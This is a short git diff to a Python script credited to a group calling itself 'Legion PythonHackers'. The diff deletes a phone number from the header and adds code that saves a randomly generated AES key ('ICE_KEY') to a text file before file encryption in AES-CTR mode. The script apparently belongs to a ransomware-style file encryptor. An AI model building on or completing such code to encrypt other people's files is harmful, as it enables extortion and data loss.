@@ -5,7 +5,7 @@ import os
 """
 	Creators   :  WinterFreak && Legion PythonHackers
 	email      :  cyber606@protonmail.com
-	phone      :  +254741106970
+	
 """
 
 
@@ -52,6 +52,9 @@ def encrypt_file(filename, crypto, size=16):
 def main():
 	
 	ICE_KEY = os.urandom(16) #test remove hardcoded shit
+	with open('systemcold.txt', 'a+b')as f:
+		f.write(ICE_KEY)
+		
 	print(ICE_KEY)
 	ctr = Counter.new(128)
 	crypt = AES.new(ICE_KEY, AES.MODE_CTR, counter=ctr)
